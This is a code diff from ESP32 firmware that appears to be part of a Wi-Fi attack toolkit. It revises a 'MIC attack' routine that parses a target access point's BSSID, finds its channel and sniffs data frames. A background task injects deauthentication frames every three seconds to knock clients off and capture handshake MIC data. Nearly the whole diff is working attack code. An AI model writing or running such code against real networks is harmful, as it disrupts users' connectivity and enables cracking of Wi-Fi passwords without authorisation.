@@ -20,8 +20,25 @@
 #include "wifi_ctl_interface.h"
 
 ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
-static uint8_t int_target_bssid[6];
-static TaskHandle_t mic_sniff_task_handle = NULL;
+static uint8_t u_target_bssid[6];
+static char c_target_bssid[12];
+static TaskHandle_t mic_deauth_inject_task_handle = NULL;
+
+void arma_mic_set_target(char *target_bssid) {
+  memcpy(c_target_bssid, target_bssid, 12);
+
+  for (uint8_t i = 0; i < 6; i++) {
+    uint8_t s1 = target_bssid[i + i];
+    uint8_t s2 = target_bssid[i + i + 1];
+    u_target_bssid[i] = convert_to_uint8_t(s1, s2);
+  }
+
+  printf(
+      "arma_mic.arma_mic_set_target > Set target AP: "
+      "%02X%02X%02X%02X%02X%02X\n",
+      u_target_bssid[0], u_target_bssid[1], u_target_bssid[2],
+      u_target_bssid[3], u_target_bssid[4], u_target_bssid[5]);
+}
 
 void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
                void *event_data) {
@@ -30,8 +47,8 @@ void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
 
   if (notification_data->atk_context == MIC_BASED) {
     printf("arma_mic.mic_notif > Received MIC attack notification\n");
-    arma_delete_task_mic_sniff_duration();
     arma_mic_finishing_sequence();
+    output_success_mic_attack(u_target_bssid);
   }
 }
 
@@ -51,63 +68,66 @@ void arma_mic_notif_event_unregister() {
       "notification\n");
 }
 
-void arma_delete_task_mic_sniff_duration() {
-  if (mic_sniff_task_handle != NULL) {
-    vTaskDelete(mic_sniff_task_handle);
-    mic_sniff_task_handle = NULL;
+void arma_mic_delete_task_deauth_inject() {
+  if (mic_deauth_inject_task_handle != NULL) {
+    vTaskDelete(mic_deauth_inject_task_handle);
+    mic_deauth_inject_task_handle = NULL;
+    printf(
+        "arma_mic.arma_mic_delete_task_deauth_inject > MIC burst deauth task "
+        "deleted\n");
   }
 }
 
 void arma_mic_finishing_sequence() {
   printf(
-      "arma_mic.arma_mic_finishing_sequence > MIC ATTACK FINISHING SEQUENCE\n");
+      "arma_mic.arma_mic_finishing_sequence > MIC ATTACK FINISHING "
+      "SEQUENCE\n");
   frame_parser_unregister_data_frame_handler();
   frame_parser_clear_target_parameter();
   arma_mic_notif_event_unregister();
   wifi_sniffer_stop();
-  arma_deauth_finish();
+  arma_mic_delete_task_deauth_inject();
 }
 
-void arma_mic_sniff_duration() {
-  while (1) {
-    // TODO: Deauth attack must be coordinated
-    // TODO: Include replay counter in message 2 output
-    vTaskDelay(10000 / portTICK_PERIOD_MS);
-    printf(
-        "arma_mic.arma_mic_sniff_duration > Failed to sniff MIC and other data "
-        "from AP: %02X%02X%02X%02X%02X%02X\n",
-        int_target_bssid[0], int_target_bssid[1], int_target_bssid[2],
-        int_target_bssid[3], int_target_bssid[4], int_target_bssid[5]);
+void arma_mic_inject_deauth() {
+  printf("arma_mic.arma_mic_inject_deauth > MIC burst deauth task created\n");
+  output_mic_operation_started(u_target_bssid);
+  int currentTime = 0;
 
-    arma_mic_finishing_sequence();
-    arma_delete_task_mic_sniff_duration();
+  while (1) {
+    vTaskDelay(1000 / portTICK_PERIOD_MS);
+    if (currentTime % 3 == 0) {
+      printf("arma_mic.arma_mic_inject_deauth > (%d) Injecting deauth\n",
+             currentTime);
+      arma_deauth_inject();
+    } else {
+      printf("arma_mic.arma_mic_inject_deauth > (%d) Time elapsed\n",
+             currentTime);
+    }
+    currentTime++;
   }
 }
 
 void arma_mic_launching_sequence(uint8_t channel) {
   printf(
       "arma_mic.arma_mic_launching_sequence > MIC ATTACK LAUNCHING SEQUENCE\n");
-  frame_parser_set_target_parameter(int_target_bssid, PARSE_MIC);
+  frame_parser_set_target_parameter(u_target_bssid, PARSE_MIC);
   frame_parser_register_data_frame_handler();
   arma_mic_notif_event_register();
   wifi_sniffer_start();
   wifi_set_filter(DATA);
   wifi_set_channel(channel);
-  arma_mic_set_target_bssid(int_target_bssid);
-  arma_deauth_launching_sequence(channel);
-  xTaskCreatePinnedToCore(arma_mic_sniff_duration, TMS_NAME, TMS_STACK_SIZE,
-                          NULL, TMS_PRIORITY, &mic_sniff_task_handle,
-                          TMS_CORE_ID);
+  arma_deauth_set_target(c_target_bssid);
+  load_deauth_payload();
+  xTaskCreatePinnedToCore(arma_mic_inject_deauth, TMDI_NAME, TMDI_STACK_SIZE,
+                          NULL, TMDI_PRIORITY, &mic_deauth_inject_task_handle,
+                          TMDI_CORE_ID);
 }
 
 void arma_mic(char *target_bssid) {
-  for (uint8_t i = 0; i < 6; i++) {
-    uint8_t s1 = target_bssid[i + i];
-    uint8_t s2 = target_bssid[i + i + 1];
-    int_target_bssid[i] = convert_to_uint8_t(s1, s2);
-  }
-
+  arma_mic_set_target(target_bssid);
   wifi_scan_aps();
+
   ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
   wifi_ap_record_t *ap_records = ap_list->ap_record_list;
   uint16_t total_scanned_aps = ap_list->count;
@@ -117,7 +137,7 @@ void arma_mic(char *target_bssid) {
     wifi_ap_record_t ap_record = ap_records[i];
     output_ap_info(&ap_record);
 
-    if (memcmp(ap_record.bssid, int_target_bssid, 6) == 0) {
+    if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
       uint8_t channel = ap_record.primary;
       printf("arma_mic.arma_mic > Channel of AP: %u\n", channel);
 
